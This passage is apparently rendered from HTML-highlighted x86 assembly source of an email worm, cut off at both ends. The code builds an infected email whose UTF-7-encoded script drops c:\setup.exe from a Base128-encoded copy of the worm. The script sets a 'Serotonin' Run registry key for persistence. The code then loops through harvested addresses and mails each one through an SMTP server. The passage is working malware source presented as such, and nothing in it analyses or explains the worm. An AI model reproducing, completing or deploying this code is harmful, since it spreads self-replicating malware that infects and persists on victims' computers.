    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_CloseHandle</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;close it</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">               </span><span class="sc1">;calculate new (bigger) size</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;of memory for email message</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sw_mail_prolog_size</span><span class="sc4">+</span><span class="sc5">sw_script_size</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_VirtualAlloc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_mail_memory</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;allocate memory, address in EDI</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sw_mail_prolog</span><span class="sc0">

</span><span class="sc5">sw_mail_prolog</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Date: '</span><span class="sc0">            </span><span class="sc1">;date field</span><span class="sc0">
</span><span class="sc5">sw_date</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">25</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">' '</span><span class="sc4">),</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Importance: High'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">    </span><span class="sc1">;importance field</span><span class="sc0">


</span><span class="sc1">;UTF-7 encoded:</span><span class="sc0">
</span><span class="sc1">;&lt;META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"&gt;</span><span class="sc0">
</span><span class="sc1">;&lt;textarea id=ss rows=1 cols=1&gt;</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'+/v/-'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'+ADwATQBFAFQAQQAgAGgAdAB0AHAALQBlAHEAdQBpAHYAPQAiAEMAbwB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'uAHQAZQBuAHQALQBUAHkAcABlACIAIABjAG8AbgB0AGUAbgB0AD0AIgB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'0AGUAeAB0AC8AaAB0AG0AbAA7ACAAYwBoAGEAcgBzAGUAdAA9AEkAUwB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'PAC0AOAA4ADUAOQAtADEAIgA+ADwAdABlAHgAdABhAHIAZQBhACAAaQB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'kAD0AcwBzACAAcgBvAHcAcwA9ADEAIABjAG8AbABzAD0AMQA+-'</span><span class="sc0">

</span><span class="sc5">@sw_mail_prolog</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">sw_mail_prolog_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">@sw_mail_prolog</span><span class="sc4">-</span><span class="sc5">sw_mail_prolog</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">sw_mail_prolog_size</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;copy to memory</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">



</span><span class="sc1">;encode worm file content to Base128 (will be stored inside &lt;textarrea&gt;&lt;/textarrea&gt; tagz)</span><span class="sc0">

</span><span class="sc5">sw_wren</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc9">bits</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">bits</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07Fh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">  </span><span class="sc1">; 00-3F =&gt; 40-7F, 40-7F =&gt; C0-FF</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">sw_BASE128</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">               </span><span class="sc1">;load bytes 0,1,2,3</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0C80Fh</span><span class="sc0">          </span><span class="sc1">;BSWAP  EAX</span><span class="sc0">
    </span><span class="sc5">sw_wren</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">;bits 0-6</span><span class="sc0">
    </span><span class="sc5">sw_wren</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">;bits 7-13</span><span class="sc0">
    </span><span class="sc5">sw_wren</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">;bits 14-20</span><span class="sc0">
    </span><span class="sc5">sw_wren</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">;bits 21-27</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;load bytes 3,4,5,6</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0C80Fh</span><span class="sc0">          </span><span class="sc1">;BSWAP  EAX</span><span class="sc0">
    </span><span class="sc5">sw_wren</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">          </span><span class="sc1">;bits 28-34</span><span class="sc0">
    </span><span class="sc5">sw_wren</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">;bits 35-41</span><span class="sc0">
    </span><span class="sc5">sw_wren</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">;bits 42-48</span><span class="sc0">
    </span><span class="sc5">sw_wren</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">;bits 49-55</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">sw_BASE128_next</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A0Dh</span><span class="sc0">        </span><span class="sc1">;put CRLF, line has length 256 characters</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc5">sw_BASE128_next</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;decrement counter</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">sw_BASE128</span><span class="sc0">      </span><span class="sc1">;[loop]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RELEASE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_file_mem</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_VirtualFree</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;dealloc memory for worm file</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sw_script_data</span><span class="sc0">

</span><span class="sc5">sw_script_data</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">;UTF-7 encoded:</span><span class="sc0">
</span><span class="sc1">;&lt;/textarea&gt;</span><span class="sc0">
</span><span class="sc1">;&lt;script language=vbs&gt;</span><span class="sc0">
</span><span class="sc1">;Sub vc(x1,x2,x3,x4,x5,x6,x7)</span><span class="sc0">
</span><span class="sc1">;fil.Write chr(x1)&amp;chr(x2)&amp;chr(x3)&amp;chr(x4)&amp;chr(x5)&amp;chr(x6)&amp;chr(x7)</span><span class="sc0">
</span><span class="sc1">;End Sub&lt;/script&gt;&lt;script language=jscript&gt;</span><span class="sc0">
</span><span class="sc1">;fso = new ActiveXObject("Scripting.FileSystemObject");</span><span class="sc0">
</span><span class="sc1">;fil = fso.CreateTextFile("c:\\setup.exe");s=ss.value.replace(/(&lt;BR&gt;)|\s/g,"");r=s.length;</span><span class="sc0">
</span><span class="sc1">;for(w=n=0;n&lt;r;){u=z()|z()|z()|z();v=z()|z()|z()|z();</span><span class="sc0">
</span><span class="sc1">;vc(u&gt;&gt;20,u&gt;&gt;12&amp;255,u&gt;&gt;4&amp;255,u&lt;&lt;4&amp;240|v&gt;&gt;24,v&gt;&gt;16&amp;255,v&gt;&gt;8&amp;255,v&amp;255)}</span><span class="sc0">
</span><span class="sc1">;fil.Close();</span><span class="sc0">
</span><span class="sc1">;h = new ActiveXObject("WScript.Shell");</span><span class="sc0">
</span><span class="sc1">;h.RegWrite ("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Serotonin",wf);</span><span class="sc0">
</span><span class="sc1">;function z(){b=s.charCodeAt(n++);return(b&amp;(b&gt;&gt;1|63))&lt;&lt;(w=w?w-7:21)}</span><span class="sc0">
</span><span class="sc1">;&lt;/script&gt;</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'+ADwALwB0AGUAeAB0AGEAcgBlAGEAPgANAAoAPABzAGMAcgBpAHAAdAA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'gAGwAYQBuAGcAdQBhAGcAZQA9AHYAYgBzAD4ADQAKAFMAdQBiACAAdgB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'jACgAeAAxACwAeAAyACwAeAAzACwAeAA0ACwAeAA1ACwAeAA2ACwAeAA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'3ACkADQAKAGYAaQBsAC4AVwByAGkAdABlACAAYwBoAHIAKAB4ADEAKQA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'mAGMAaAByACgAeAAyACkAJgBjAGgAcgAoAHgAMwApACYAYwBoAHIAKAB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'4ADQAKQAmAGMAaAByACgAeAA1ACkAJgBjAGgAcgAoAHgANgApACYAYwB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'oAHIAKAB4ADcAKQANAAoARQBuAGQAIABTAHUAYgA8AC8AcwBjAHIAaQB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'wAHQAPgANAAoAPABzAGMAcgBpAHAAdAAgAGwAYQBuAGcAdQBhAGcAZQA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'9AGoAcwBjAHIAaQBwAHQAPgBmAHMAbwAgAD0AIABuAGUAdwAgAEEAYwB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'0AGkAdgBlAFgATwBiAGoAZQBjAHQAKAAiAFMAYwByAGkAcAB0AGkAbgB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'nAC4ARgBpAGwAZQBTAHkAcwB0AGUAbQBPAGIAagBlAGMAdAAiACkAOwB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'3AGYAPQAiAGMAOgBcAFwAcwBlAHQAdQBwAC4AZQB4AGUAIgA7AC8ALw-'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'+AGYAaQBsACAAPQAgAGYAcwBvAC4AQwByAGUAYQB0AGUAVABlAHgAdAB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GAGkAbABlACgAdwBmACkAOwBzAD0AcwBzAC4AdgBhAGwAdQBlAC4AcgB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'lAHAAbABhAGMAZQAoAC8AKAA8AEIAUgA+ACkAfABcAHMALwBnACwAIgA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'iACkAOwByAD0AcwAuAGwAZQBuAGcAdABoADsAZgBvAHIAKAB3AD0AbgA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'9ADAAOwBuADwAcgA7ACkAewB1AD0AegAoACkAfAB6ACgAKQB8AHoAKAA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'pAHwAegAoACkAOwB2AD0AegAoACkAfAB6ACgAKQB8AHoAKAApAHwAegA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'oACkAOwB2AGMAKAB1AD4APgAyADAALAB1AD4APgAxADIAJgAyADUANQA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'sAHUAPgA+ADQAJgAyADUANQAsAHUAPAA8ADQAJgAyADQAMAB8AHYAPgA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'+ADIANAAsAHYAPgA+ADEANgAmADIANQA1ACwAdgA+AD4AOAAmADIANQA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'1ACwAdgAmADIANQA1ACkAfQBmAGkAbAAuAEMAbABvAHMAZQAoACkAOwB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'oACAAPQAgAG4AZQB3ACAAQQBjAHQAaQB2AGUAWABPAGIAagBlAGMAdAA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'oACIAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkAOwAvAC8-'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'+AGgALgBSAGUAZwBXAHIAaQB0AGUAKAAiAEgASwBFAFkAXwBDAFUAUgB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SAEUATgBUAF8AVQBTAEUAUgBcAFwAUwBvAGYAdAB3AGEAcgBlAFwAXAB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'NAGkAYwByAG8AcwBvAGYAdABcAFwAVwBpAG4AZABvAHcAcwBcAFwAQwB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAXABSAHUAbgBcAFwAUwB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'lAHIAbwB0AG8AbgBpAG4AIgAsAHcAZgApADsAZgB1AG4AYwB0AGkAbwB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'uACAAegAoACkAewBiAD0AcwAuAGMAaABhAHIAQwBvAGQAZQBBAHQAKAB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'uACsAKwApADsAcgBlAHQAdQByAG4AKABiACYAKABiAD4APgAxAHwANgA'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'zACkAKQA8ADwAKAB3AD0AdwA/AHcALQA3ADoAMgAxACkAfQA8AC8AcwB'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'jAHIAaQBwAHQAPg-'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">@sw_script_data</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">sw_script_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">@sw_script_data</span><span class="sc4">-</span><span class="sc5">sw_script_data</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">sw_script_size</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;copy to memory</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">           </span><span class="sc1">;ptr to email addresses</span><span class="sc0">
</span><span class="sc5">sw_ebx</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">sw_l_sendmail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_sendmail</span><span class="sc0">         </span><span class="sc1">;send constructed email to email address</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">@endsz</span><span class="sc0">                  </span><span class="sc1">;get next email address</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;ECX=0 if it was the last one</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">sw_e_sendmail</span><span class="sc0">           </span><span class="sc1">;yeah, quit</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">sw_l_sendmail</span><span class="sc0">           </span><span class="sc1">;no, send to next email address</span><span class="sc0">



</span><span class="sc5">sw_e_sendmail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RELEASE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_mail_memory</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_VirtualFree</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc1">;deallocate memory for mail message</span><span class="sc0">

</span><span class="sc5">sw_endwsock</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_WSACleanup</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;unitialize WSOCK32</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_wsock32</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_FreeLibrary</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;unload WSOCK32.dll</span><span class="sc0">

</span><span class="sc5">sw_seh</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">           </span><span class="sc1">;return count of sent emailz</span><span class="sc0">
</span><span class="sc5">sw_count</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">sw_endwsa</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">






</span><span class="sc1">;this procedure sends one infected email to specified email address</span><span class="sc0">

</span><span class="sc5">sw_sendmail</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_socket</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;create socket</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sw_endwsa</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'smtp.iol.cz'</span><span class="sc0">           </span><span class="sc1">;smtp server</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_gethostbyname</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;resolve host</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sw_endsocket</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
